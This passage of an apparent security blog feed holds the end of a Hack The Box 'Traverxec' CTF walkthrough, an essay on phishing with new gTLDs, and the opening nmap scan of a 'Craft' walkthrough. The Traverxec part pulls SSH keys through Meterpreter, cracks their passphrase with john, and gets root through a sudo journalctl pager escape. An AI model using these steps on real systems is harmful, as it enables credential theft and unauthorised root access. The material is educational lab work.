&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;MAIN &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MANDATORY]
&lt;span class=&quot;go&quot;&gt;
servername    traverxec.htb
serverlisten    *
serveradmin   david@traverxec.htb
serverroot    /var/nostromo
servermimes   conf/mimes
docroot     /var/nostromo/htdocs
docindex    index.html

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;LOGS &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONAL]
&lt;span class=&quot;go&quot;&gt;
logpid      logs/nhttpd.pid

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;SETUID &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RECOMMENDED]
&lt;span class=&quot;go&quot;&gt;
user      www-data

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;BASIC AUTHENTICATION &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONAL]
&lt;span class=&quot;go&quot;&gt;
htaccess    .htaccess
htpasswd    /var/nostromo/conf/.htpasswd

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ALIASES &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONAL]
&lt;span class=&quot;go&quot;&gt;
/icons      /var/nostromo/icons

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;HOMEDIRS &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONAL]
&lt;span class=&quot;go&quot;&gt;
homedirs    /home
homedirs_public   public_www

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The configuration file above indicates the existence of a &lt;code class=&quot;highlighter-rouge&quot;&gt;public_www&lt;/code&gt; directory inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory. After some trial and error, we can determine that this is David’s home directory, as he’s the admin.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; cd /home/david/public_www
meterpreter &amp;gt; ls
Listing: /home/david/public_www
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  402   fil   2019-10-25 15:45:10 -0400  index.html
40755/rwxr-xr-x   4096  dir   2019-10-25 17:02:59 -0400  protected-file-area
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we find a directory named &lt;code class=&quot;highlighter-rouge&quot;&gt;protected-file-area&lt;/code&gt; inside of &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/david/public_www&lt;/code&gt;. This folder contains &lt;code class=&quot;highlighter-rouge&quot;&gt;backup-ssh-identity-files.tgz&lt;/code&gt;, which we can hopefully use to gain user access to the box as david.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; cd ./protected-file-area
meterpreter &amp;gt; ls
Listing: /home/david/public_www/protected-file-area
===================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  45    fil   2019-10-25 15:46:01 -0400  .htaccess
100644/rw-r--r--  1915  fil   2019-10-25 17:02:59 -0400  backup-ssh-identity-files.tgz

meterpreter &amp;gt; download ./backup-ssh-identity-files.tgz ./
[*] Downloading: ./backup-ssh-identity-files.tgz -&amp;gt; .//backup-ssh-identity-files.tgz
[*] Downloaded 1.87 KiB of 1.87 KiB (100.0%): ./backup-ssh-identity-files.tgz -&amp;gt; .//backup-ssh-identity-files.tgz
[*] download   : ./backup-ssh-identity-files.tgz -&amp;gt; .//backup-ssh-identity-files.tgz
meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can download the &lt;code class=&quot;highlighter-rouge&quot;&gt;backup-ssh-identity-files.tgz&lt;/code&gt; file through our Meterpreter session, and then extract it on our Kali box.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# tar -zxvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When we try and use the keys we’ll see that David has set a password required to unlock them, annoying. Using &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt; we can create a hash of the private key to use to brute force the key through john.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/home/david/.ssh# python ~/Tools/ssh2john.py id_rsa &amp;gt; id_rsa_hash
root@kali:~/home/david/.ssh# ls -lah
total 24K
drwx------ 2 1000 1000 4.0K Dec 15 19:55 .
drwxr-xr-x 3 root root 4.0K Dec 12 20:27 ..
-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 authorized_keys
-rw------- 1 1000 1000 1.8K Oct 25 17:02 id_rsa
-rw-r--r-- 1 root root 2.5K Dec 15 19:55 id_rsa_hash
-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 id_rsa.pub
root@kali:~/home/david/.ssh# john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:06 DONE (2019-12-15 19:56) 0.1547g/s 2220Kp/s 2220Kc/s 2220KC/sa6_123..*7¡Vamos!
Session completed
root@kali:~/home/david/.ssh# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After running john and the &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; wordlist to try and crack the key, we get &lt;code class=&quot;highlighter-rouge&quot;&gt;hunter&lt;/code&gt;. Now that we’ve got the got the keys and the credentials to use them, we can ssh in as David and grab the flag.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/home/david/.ssh# ssh david@traverxec.htb

Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sun Dec 15 19:54:38 2019 from 10.10.15.105
david@traverxec:~$ 
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
&lt;p&gt;David’s home directory has a directory within it called &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin&lt;/code&gt;, which sticks out immediately. Exploring that directory we find &lt;code class=&quot;highlighter-rouge&quot;&gt;server-stats.sh&lt;/code&gt;. This file appears to use the sudo command, as seen on the last line below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~/bin$ ls
journalctl  server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo &quot;Load: `/usr/bin/uptime`&quot;
echo &quot; &quot;
echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;
echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;
echo &quot; &quot;
echo &quot;Last 5 journal log lines:&quot;
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
david@traverxec:~/bin$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Knowing that this script is calling &lt;code class=&quot;highlighter-rouge&quot;&gt;journalctl&lt;/code&gt; as root means that it’s most definitely going to be what we need to exploit for our privilege escalation. Looking at &lt;a href=&quot;https://gtfobins.github.io/gtfobins/journalctl/&quot;&gt;GTFOBins&lt;/a&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;journalctl&lt;/code&gt; it states that the pager will be invoked (&lt;code class=&quot;highlighter-rouge&quot;&gt;less&lt;/code&gt;). We can pop a shell using &lt;code class=&quot;highlighter-rouge&quot;&gt;!/bin/sh&lt;/code&gt;, or we can execute basically any commands we’d like if we precede them with &lt;code class=&quot;highlighter-rouge&quot;&gt;!&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After some playing around we can confirm that executing &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service&lt;/code&gt; does not require us to enter a password, and does indeed invoke &lt;code class=&quot;highlighter-rouge&quot;&gt;less&lt;/code&gt;. All we need to do in order to exploit this is to shrink the terminal window down a bit, under 6 lines, and execute &lt;code class=&quot;highlighter-rouge&quot;&gt;!/bin/bash&lt;/code&gt; to get our root shell.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2019-12-17 10:09:44 EST, end at Tue 2019-12-17 11:38:42 EST. --
Dec 17 11:15:54 traverxec sudo[2264]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Dec 17 11:15:54 traverxec sudo[2264]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
Dec 17 11:18:40 traverxec sudo[2319]: pam_unix(sudo:auth): conversation failed
Dec 17 11:18:40 traverxec sudo[2319]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Dec 17 11:18:40 traverxec sudo[2319]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
!/usr/bin/bash
root@traverxec:/home/david/bin# cat /root/root.txt
9aa36a6d76f785dfd320a478f6e0d906
root@traverxec:/home/david/bin# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This box was really straight forward for the most part. The initial foothold was obvious, and using the Metasploit module made it very easy. Finding the public directory inside David’s home directory via the nostromo configuration was probably the most confusing part, at least from my perspective. Once we found that directory, Meterpreter allowed us to download the backup file of ssh keys quite easily. The keys did have a password, but cracking this was also rather simple since the password would be present on almost any wordlist. The path to root was clear immediately after gaining access as the user. While the method we were to use to exploit it was also clear right away, actually doing so still took me about a day, as I was over thinking it a bit. Traverxec was a fun box, and well named. It was my first box in quite a few months, and a nice reintroduction.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><summary type="html"></summary></entry><entry><title type="html">Plenty of Phish: Users, Trust and gTLDs</title><link href="http://0.0.0.0:4000/plenty-of-phish-trust-and-gtlds/" rel="alternate" type="text/html" title="Plenty of Phish: Users, Trust and gTLDs" /><published>2020-01-28T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/plenty-of-phish</id><content type="html" xml:base="http://0.0.0.0:4000/plenty-of-phish-trust-and-gtlds/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;For some time now, I’ve expected the introduction of new top level domains to confuse the general public. When users are confused, they’re more easily manipulated, making them more likely to fall for age old tricks like phishing attacks.&lt;/p&gt;

&lt;h2 id=&quot;new-gtlds&quot;&gt;New gTLDs&lt;/h2&gt;
&lt;p&gt;It’s been almost 9 years since the announcement below from ICANN came out regarding new top level domains, meaning there would be many more options than the traditional &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.org&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.net&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.biz&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.gov&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.edu&lt;/code&gt;, etc.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ICANN will soon begin a global campaign to tell the world about this dramatic change in Internet names and to raise awareness of the opportunities afforded by new gTLDs. Applications for new gTLDs will be accepted from 12 January 2012 to 12 April 2012 &lt;a href=&quot;https://www.icann.org/news/announcement-2011-06-20-en&quot;&gt;source&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now we’re in the year 2020, and I’d say that the nontechnical community still does not understand how domain names work, or what new gTLDs even are. Many new domain extensions have been released, but how businesses and individuals are choosing to use them is still not very clear. Are businesses supposed to use &lt;code class=&quot;highlighter-rouge&quot;&gt;.support&lt;/code&gt; for their help desk, and &lt;code class=&quot;highlighter-rouge&quot;&gt;.careers&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;.jobs&lt;/code&gt; for their hiring pages? Or are they just supposed to use &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt; still?&lt;/p&gt;

&lt;p&gt;To get an idea of what extensions are available, take a look at &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains&quot;&gt;Wikipedia’s List of Internet Top Level Domains&lt;/a&gt;, primarily the ICANN-era generic top-level domains. There you’ll find the English language domains listed alphabetically in tables indicating their target market, restrictions, registry, etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/domain_table.png&quot; alt=&quot;Domain Table&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 1&lt;/strong&gt;: Partial table of English language generic top-level domains beginning with ‘C’.&lt;/p&gt;

&lt;h1 id=&quot;traditional-phishing&quot;&gt;Traditional Phishing&lt;/h1&gt;
&lt;p&gt;When educating users about what to look for in order to identify a phishing attack, things like SSL certificates and valid domain names have been at the top of the list. In the past it wasn’t typical for phishing sites to pay to obtain an SSL certificate, so we told users to check for the lock in the url bar. It was also common for phishing sites to use misspellings, or modified versions (url padding) of company domain names with the &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt; extension in order to gain a user’s trust. This means things like changing &lt;code class=&quot;highlighter-rouge&quot;&gt;wellsfargo&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;wells-fargo&lt;/code&gt;, or &lt;code class=&quot;highlighter-rouge&quot;&gt;wells-fargo-bank&lt;/code&gt;. In certain instances the url bar on mobile sites is too short to even display an entire domain name, which creates additional problems.&lt;/p&gt;

&lt;h2 id=&quot;tlds&quot;&gt;TLDs&lt;/h2&gt;
&lt;p&gt;According to &lt;a href=&quot;https://phishlabs.com&quot;&gt;Phish Labs&lt;/a&gt; the majority of phishing sites are compromised hosts, and thus use valid domains. This accounts for the majority of phishing domains still being &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt; extensions. Of course, if a domain is compromised then there isn’t much to do from a user’s perspective, as the site will likely appear valid in every way.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Historically, most phishing sites have been hosted on legitimate domains that are compromised, rather than domains specifically registered by phishers. As a result, the breakdown of TLDs used for phishing sites has closely mirrored that of the general website population &lt;a href=&quot;https://info.phishlabs.com/hubfs/2019%20PTI%20Report/2019%20Phishing%20Trends%20and%20Intelligence%20Report.pdf&quot;&gt;source&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;ssl-certificates&quot;&gt;SSL Certificates&lt;/h2&gt;
&lt;p&gt;With the introduction of free certificate authorities such as &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;LetsEncrypt&lt;/a&gt;, the lock in a user’s browser now only instills in them a false confidence. Phishing sites no longer need to pay for this certificate, and there is no protection. Users need to be aware that the lock means an encrypted connection to a site, not that the site itself is valid or secure in any way. The majority of users do not know how to check the certificate authority, and don’t know the difference between &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;LetsEncrypt&lt;/a&gt; and &lt;a href=&quot;https://www.digicert.com/&quot;&gt;DigiCert&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In 2018 threat actors continued to abuse SSL certificates to bypass browser filtering and add credibility to phishing sites &lt;a href=&quot;https://info.phishlabs.com/hubfs/2019%20PTI%20Report/2019%20Phishing%20Trends%20and%20Intelligence%20Report.pdf&quot;&gt;source&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/digicert_price.png&quot; alt=&quot;DigiCert Price&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 2&lt;/strong&gt;: DigiCert’s cheapest certificate is $207, a big investment for a throwaway phishing site.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/letsencrypt_price.png&quot; alt=&quot;LetsEncrypt Price&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 3&lt;/strong&gt;: LetsEncrypt is free, which is great for privacy overall, but SSL certs do not validate a site’s identity.&lt;/p&gt;

&lt;h1 id=&quot;modern-phishing&quot;&gt;Modern Phishing&lt;/h1&gt;
&lt;p&gt;New forms of phishing attacks have emerged as a result of all these new gTLD’s. These extensions can be used to gather specific information from victims. A few hypothetical examples can be found below.&lt;/p&gt;

&lt;h2 id=&quot;gtld-phishing&quot;&gt;gTLD Phishing&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;The number of phishing sites observed on gTLDs more than doubled last year, and their share of total phishing volume rose from 5% to 8% &lt;a href=&quot;https://info.phishlabs.com/hubfs/2019%20PTI%20Report/2019%20Phishing%20Trends%20and%20Intelligence%20Report.pdf&quot;&gt;source&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;plausible-attack-scenarios&quot;&gt;Plausible Attack Scenarios&lt;/h2&gt;
&lt;p&gt;The numerous amount of new domain extensions allow for a lot of creativity now when creating a phishing campaign. There are many industry specific domains that can be purchased to manipulate users in a particular industry (see World Cup example below). I can also imagine certain extensions being used across various industries to steal sensitive information.&lt;/p&gt;

&lt;h3 id=&quot;identity-theft&quot;&gt;Identity Theft&lt;/h3&gt;
&lt;p&gt;I see the extensions &lt;code class=&quot;highlighter-rouge&quot;&gt;.careers&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;.jobs&lt;/code&gt; as being particularly vulnerable to collect information by creating phishing sites targeting job applicants for a particular business.&lt;/p&gt;

&lt;h3 id=&quot;credential-harvesting&quot;&gt;Credential Harvesting&lt;/h3&gt;
&lt;p&gt;It seems also that &lt;code class=&quot;highlighter-rouge&quot;&gt;.security&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.shipping&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.support&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.review&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.vote&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.legal&lt;/code&gt; could all be used to manipulate users into providing their account credentials. For instance, a spear phishing campaign using the &lt;code class=&quot;highlighter-rouge&quot;&gt;.legal&lt;/code&gt; extension notifying users that they must login to their account and accept a new terms of service agreement in order to continue using a particular site. The &lt;code class=&quot;highlighter-rouge&quot;&gt;.shipping&lt;/code&gt; extension could be used to trick users into providing their account credentials thinking that they’re logging into a site to track an order. The number of scams that can be run is limited only by one’s imagination.&lt;/p&gt;

&lt;h3 id=&quot;anonymous-domain-registration-and-hosting&quot;&gt;Anonymous Domain Registration and Hosting&lt;/h3&gt;
&lt;p&gt;For the purposes of this article I think it’s important to point out that domains can be registered, and hosting can be purchased, completely anonymously by using services such as &lt;a href=&quot;https://njal.la&quot;&gt;Njalla&lt;/a&gt;. &lt;a href=&quot;https://njal.la&quot;&gt;Njalla&lt;/a&gt; is accessible anonymously via the &lt;a href=&quot;https://www.torproject.org/&quot;&gt;Tor Network&lt;/a&gt; at &lt;a href=&quot;njalladnspotetti.onion&quot;&gt;njalladnspotetti.onion&lt;/a&gt;, and individuals can pay for these services anonymously using crypto currencies. This means the owner of a site is difficult or even impossible to determine, which is ideal for any criminal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/njalla.png&quot; alt=&quot;Njalla&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 4:&lt;/strong&gt; Njalla offers anonymous domain registration and hosting plans.&lt;/p&gt;

&lt;h2 id=&quot;world-cup-example&quot;&gt;World Cup Example&lt;/h2&gt;
&lt;p&gt;There have been instances of gTLD’s being used for industry specific phishing attacks already. One example can be found during the 2018 World Cup. Domains specific to the soccer industry, and the World Cup itself, were being registered and used to phish for sensitive information.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Well-designed website interfaces featuring stolen logos are created to dupe users into sharing personal and financial information. To seem more credible, cybercriminals are registering domain names with keywords like &lt;code class=&quot;highlighter-rouge&quot;&gt;world&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;worldcup&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Russia&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;FIFA&lt;/code&gt; &lt;a href=&quot;https://www.eurodns.com/blog/top-level-domains-cybercriminals&quot;&gt;source&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;remediation&quot;&gt;Remediation&lt;/h1&gt;

&lt;h2 id=&quot;for-users&quot;&gt;For Users&lt;/h2&gt;
&lt;p&gt;There are a couple things that the technically literate crowd can use to help easily help identify a phishing site from a legitimate one. Educating the masses on these techniques may be imperative as new domain extensions become more common in the future.&lt;/p&gt;

&lt;h3 id=&quot;whois&quot;&gt;Whois&lt;/h3&gt;
&lt;p&gt;If users are educated enough to utilize &lt;a href=&quot;https://www.whois.com/whois&quot;&gt;whois&lt;/a&gt; info in order to determine who registered a particular domain, they may find that the entity who registered the &lt;code class=&quot;highlighter-rouge&quot;&gt;.careers&lt;/code&gt; extension is not the same entity that registered the &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt; extension, and this is a major red flag.&lt;/p&gt;

&lt;h3 id=&quot;certificate-authority&quot;&gt;Certificate Authority&lt;/h3&gt;
&lt;p&gt;As I previously mentioned, if users are educated enough to determine who issued the site’s SSL certificate, they may find that the &lt;code class=&quot;highlighter-rouge&quot;&gt;.careers&lt;/code&gt; extension is LetsEncrypt, while the &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt; is &lt;a href=&quot;https://www.digicert.com/&quot;&gt;DigiCert&lt;/a&gt;. Any major entity using LetsEncrypt would be a major red flag in my eyes.&lt;/p&gt;

&lt;h2 id=&quot;for-businesses&quot;&gt;For Businesses&lt;/h2&gt;
&lt;p&gt;You may be wondering, how a company can register all extensions related to their brand to protect themselves from such an attack?  Register your trademark with the &lt;a href=&quot;http://trademark-clearinghouse.com/&quot;&gt;Trademark Clearing House&lt;/a&gt;. For $150 per trademark a business is given some significant protections.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Registration and verification of the trademark record&lt;/li&gt;
  &lt;li&gt;Sunrise services for all new gTLD Sunrise periods, not just one&lt;/li&gt;
  &lt;li&gt;Trademark claims services for all new gTLDs, not just one&lt;/li&gt;
  &lt;li&gt;Linking up to 10 domain name labels to the registration&lt;/li&gt;
  &lt;li&gt;Ongoing Notifications&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://trademark-clearinghouse.com/content/trademark-clearinghouse-fees&quot;&gt;source&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The implementation of so many new domain name extensions opens up the potential for a lot of creative phishing campaigns. The world is still getting used to all these new domain names, and the way that they’re being put into practice is still not clearly defined. For instance, &lt;a href=&quot;https://nike.shoes&quot;&gt;nike.shoes&lt;/a&gt; simply redirects to &lt;a href=&quot;https://nike.com&quot;&gt;nike.com&lt;/a&gt;, and &lt;a href=&quot;https://peets.coffee&quot;&gt;peets.coffee&lt;/a&gt; redirects to &lt;a href=&quot;https://peets.com&quot;&gt;peets.com&lt;/a&gt;. However, I believe the intent of these new domain extensions is not to have them all redirect to &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt;. The intent is that industry specific domains will be used within particular industries, and extensions like &lt;code class=&quot;highlighter-rouge&quot;&gt;.careers&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.support&lt;/code&gt; will be used by different departments of larger companies for specific use cases. None the less, even though it’s been 9 years now this is all still very new. Things are still rather confusing for businesses and users alike. When there is confusion, there is room for exploitation. I’ve been anticipating an exploitation of this confusion for a long time years now, we’ve seen it happen already, and I expect it to happen a whole lot more before things get figured out.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="Security" /><category term="Phishing" /><summary type="html">Introduction For some time now, I’ve expected the introduction of new top level domains to confuse the general public. When users are confused, they’re more easily manipulated, making them more likely to fall for age old tricks like phishing attacks.</summary></entry><entry><title type="html">Hack The Box - Craft</title><link href="http://0.0.0.0:4000/hack-the-box-craft-writeup/" rel="alternate" type="text/html" title="Hack The Box - Craft" /><published>2020-01-05T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-craft</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/craft/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Today they retired my favorite box so far, Craft. This box was very real world in the chain of mistakes that lead to each exploit. The beer theme and Silicon Valley theme were also awesome. A+ box, and here’s the writeup.&lt;/p&gt;

&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;

&lt;h2 id=&quot;port-scan-nmap&quot;&gt;Port Scan: Nmap&lt;/h2&gt;
&lt;p&gt;We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; 10.10.10.110
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-13 23:23 EDT
Nmap scan report for craft.htb (10.10.10.110)
Host is up (0.40s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:linux:linux_kernel
&lt;span class=&quot;go&quot;&gt;
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.69 seconds
